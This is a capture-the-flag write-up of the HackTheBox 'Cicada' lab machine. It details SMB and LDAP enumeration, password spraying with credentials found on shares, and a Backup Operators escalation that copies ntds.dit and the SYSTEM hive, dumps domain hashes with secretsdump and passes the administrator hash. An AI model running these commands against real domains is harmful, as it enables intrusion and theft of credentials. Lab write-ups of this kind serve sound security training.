---
title: "Cicada HackTheBox" 
date: 2025-07-4 00:26:00 0000+
tags: [WriteUp, Cicada, HTB, Enumeration, BackupOperators, Active Directory, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Cicada_HTB/preview_cicada.png
---
# Cicada HTB Writeup

Cicada is an easy box on HTB platform which focuses mainly on Enumeration only to gain our initial foothold and on further enumeration reveals a user is a part of Backup Operators group which can then be used to gain Administrator access to the box.

![image.png](/assets/images/Cicada_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to scan open ports and services running on the box and by looking at the results its an Active Directory box.

```bash
rustmap.py -ip 10.129.83.52
```

![image.png](/assets/images/Cicada_HTB/image%201.png)

![image.png](/assets/images/Cicada_HTB/image%202.png)

![image.png](/assets/images/Cicada_HTB/image%203.png)

![image.png](/assets/images/Cicada_HTB/image%204.png)

### DNS Enumeration

I did the DNS enumeration with two flags MS and TXT sections but did not find anything useful there.

```bash
dig @cicada-dc.cicada.htb cicada.htb MS
```

![image.png](/assets/images/Cicada_HTB/image%205.png)

```bash
dig @cicada-dc.cicada.htb cicada.htb TXT
```

![image.png](/assets/images/Cicada_HTB/image%206.png)

### SMB Enumeration

Since the ports 139 and 445 are open on the box, lets proceed with the smb enumeration using NetExec.

Tried to do the null authentication and tried to enumerate shares.

```bash
nxc smb cicada.htb -u '' -p ''
nxc smb cicada.htb -u '' -p '' --shares
```

![image.png](/assets/images/Cicada_HTB/image%207.png)

Now proceeded with the guest login attempts

```bash
nxc smb cicada.htb -u '.' -p '' --shares
```

![image.png](/assets/images/Cicada_HTB/image%208.png)

As guest user we have read access to the HR share on the server. 

Connecting to the HR share using smbclient.

```bash
smbclient //cicada.htb/HR -U '.'%
```

![image.png](/assets/images/Cicada_HTB/image%209.png)

Going through the **“Notice from HR.txt”**

![image.png](/assets/images/Cicada_HTB/image%2010.png)

There is a password present in this file, grabbing it and saving it to a creds.txt file, also we need usernames to authenticate this password for.

I also check the **IPC$** share but didn’t found anything.

## Exploitation

Now for the user enumeration part I did **RID Bruteforce** on the guest authentication of NetExec.

```bash
nxc smb cicada.htb -u '.' -p '' --rid-brute
```

Which resulted in giving us the whole list of users in the domain.

![image.png](/assets/images/Cicada_HTB/image%2011.png)

Adding them in the domainusernames.txt file.

These are all the users I filtered out from the above data.

![image.png](/assets/images/Cicada_HTB/image%2012.png)

Now we do the password spray attack on these users with the password found in the **Notice from HR.txt** file.

```bash
nxc ldap cicada.htb -u domainusernames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![image.png](/assets/images/Cicada_HTB/image%2013.png)

We got the valid credentials for the **“michael.wrightson”** user in the domain. Added them to the creds.txt file

Also I tried to enumerate users on the domain with **michael.wrightson** credentials and found that **david.orelious** has stored their password in the description section of their LDAP account.

```bash
nxc ldap cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![image.png](/assets/images/Cicada_HTB/image%2014.png)

I again did a password spray on all the domain users using the password for **david.orelious** to check that other accounts are using his password or not.

But seems like its his password only.

```bash
nxc ldap cicada.htb -u domainusernames.txt -p 'aRt$Lp#7t*VQ!3' --continue-on-success
```

![image.png](/assets/images/Cicada_HTB/image%2015.png)

Added that credential to my creds.txt file.

These both users dont have winrm access to the server.

![image.png](/assets/images/Cicada_HTB/image%2016.png)

Used bloodhound-python to gather ldap data form the domain.

```bash
bloodhound-python -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -dc cicada-dc.cicada.htb -d cicada.htb -ns 10.129.83.52 -c all --zip
```

![image.png](/assets/images/Cicada_HTB/image%2017.png)

Since I had valid credentials I was able to gather domain data using bloodhound-python.

Now analyzing this in bloodhound.

Did some enumeration in bloodhound but did not found anything useful.

### Shell as Emily

After going through more enumeration I remembered that as a guest user I had access to the HR share on the smb.

I tried to list smb shares as michael.wrightson.

![image.png](/assets/images/Cicada_HTB/image%2018.png)

Our permissions increased to the NETLOGON and SYSVOL share.

Then I tried to list smb shares for the david.orelious.

![image.png](/assets/images/Cicada_HTB/image%2019.png)

Now here we can see that as david we have read access to the **DEV** share on the box.

Using smbclient to list DEV share.

```bash
smbclient //cicada.htb/DEV -U 'david.orelious'%'aRt$Lp#7t*VQ!3'
```

![image.png](/assets/images/Cicada_HTB/image%2020.png)

We found a backup_script.ps1 file on the share downloaded it to our local machine.

Looking at the script we have a new credentials for user **emily.oscars**

![image.png](/assets/images/Cicada_HTB/image%2021.png)

Now adding this to our creds.txt file and again doing the password spray on the domain users.

```bash
nxc ldap cicada.htb -u domainusernames.txt -p 'Q!3@Lp#M6b*7t*Vt' --continue-on-success
```

![image.png](/assets/images/Cicada_HTB/image%2022.png)

It says pwned! means now we have elevated access to the box i.e. we can winrm into it.

```bash
nxc winrm cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![image.png](/assets/images/Cicada_HTB/image%2023.png)

Hence we can winrm into the box !!

```bash
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![image.png](/assets/images/Cicada_HTB/image%2024.png)

Grabbing our user.txt file and submitting it.

## Privilege Escalation

Now after enumerating Emily’s account we found that she is the part of **“Backup Operators”** group.

![image.png](/assets/images/Cicada_HTB/image%2025.png)

The users in the backup operators group can create a shadow copy of the system.hive and the ntds.dit database to escalate their privileges.

So we create a backup.txt file containing following commands in our attacker machine.

```powershell
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

![image.png](/assets/images/Cicada_HTB/image%2026.png)

Now if we send this file directly to windows machine and execute it, It will result in formatting errors so first we need to convert this file to the DOS format.

![image.png](/assets/images/Cicada_HTB/image%2027.png)

Now we send this file to our windows machine using emily’s winrm access.

![image.png](/assets/images/Cicada_HTB/image%2028.png)

Now we use diskshadow.exe

```powershell
diskshadow /s backup.txt
```

![image.png](/assets/images/Cicada_HTB/image%2029.png)

As we can see that the shadow copy is successfully exposed in the E:\ drive.

Now we use robocopy to copy the ntds.dit database file to our shadow drive E:\

```powershell
robocopy /b E:\windows\ntds . ntds.dit
```

![image.png](/assets/images/Cicada_HTB/image%2030.png)

![image.png](/assets/images/Cicada_HTB/image%2031.png)

Now we can save the system.hive too in our temp directory.

```powershell
reg save hklm\system c:\temp\system.hive
```

![image.png](/assets/images/Cicada_HTB/image%2032.png)

After saving both NTDS.DIT and SYSTEM, we can download both the files to our attacker machine.

```powershell
download ntds.dit
download system.hive
```

![image.png](/assets/images/Cicada_HTB/image%2033.png)

After successful download of both NTDS.DIT and SYSTEM, we can use [secretsdump.py](http://secretsdump.py) to extract credentials form them.

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

![image.png](/assets/images/Cicada_HTB/image%2034.png)

Now we have the whole domain dump with us, we also have the administrator hash, now we can do pass the hash to claim administrator.

### Shell as Administrator

Using NetExec to confirm that we have the correct NT hash for the administrator.

```bash
nxc ldap cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

![image.png](/assets/images/Cicada_HTB/image%2035.png)

Hence we have administrator access to the system.

Using Evil-winrm to login.

```bash
evil-winrm -i cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

![image.png](/assets/images/Cicada_HTB/image%2036.png)

Thanks for reading 😄

![image.png](/assets/images/Cicada_HTB/image%2037.png)
